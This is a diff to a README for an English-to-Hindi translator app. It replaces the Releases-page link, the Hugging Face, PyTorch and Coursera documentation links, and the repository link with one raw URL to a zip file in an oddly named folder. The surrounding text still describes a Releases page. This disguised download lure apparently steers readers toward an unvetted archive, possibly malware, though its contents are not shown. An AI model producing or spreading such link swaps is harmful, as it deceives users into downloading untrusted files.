@@ -1,6 +1,6 @@
 # 🌐 Translator_En2Hi - Translate English to Hindi with Ease
 
-[![Download Translator_En2Hi](https://img.shields.io/badge/Download-Translator_En2Hi-blue.svg)](https://github.com/dasdarshan7/Translator_En2Hi/releases)
+[![Download Translator_En2Hi](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ To ensure the application runs smoothly, make sure your system meets the followi
 
 You can download Translator_En2Hi from the Releases page. 
 
-[Visit this page to download](https://github.com/dasdarshan7/Translator_En2Hi/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of the software.
@@ -65,15 +65,15 @@ If you run into any issues while using Translator_En2Hi, consider the following:
 
 For more detailed information about how Translator_En2Hi works, check the following resources:
 
-- [Hugging Face Documentation](https://huggingface.co/docs)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Machine Learning Basics](https://www.coursera.org/learn/machine-learning)
+- [Hugging Face Documentation](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
 
 If you have any questions or feedback, you can also reach us through the GitHub repository.
 
 ## 🔗 Links
 
-- [Download Translator_En2Hi](https://github.com/dasdarshan7/Translator_En2Hi/releases) 
-- [GitHub Repository](https://github.com/dasdarshan7/Translator_En2Hi)
+- [Download Translator_En2Hi](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip) 
+- [GitHub Repository](https://raw.githubusercontent.com/dasdarshan7/Translator_En2Hi/main/thrummer/Translator_En2Hi.zip)
 
 Thank you for using Translator_En2Hi! Enjoy translating!
